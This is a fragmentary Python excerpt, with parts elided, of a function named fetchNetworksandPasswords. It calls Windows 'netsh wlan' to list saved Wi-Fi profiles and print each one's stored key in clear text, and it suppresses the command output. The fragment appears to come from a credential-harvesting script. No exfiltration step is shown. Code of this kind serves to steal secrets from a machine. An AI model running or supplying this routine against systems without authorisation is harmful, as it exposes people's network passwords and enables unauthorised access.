...
def fetchNetworksandPasswords():
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], stdout=FNULL, stderr=FNULL).decode('utf-8').split('\n')
    networks = []
    for x in data:
    ...
    passwordlist = []
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], stdout=FNULL, stderr=FNULL).decode('utf-8').split('\n')
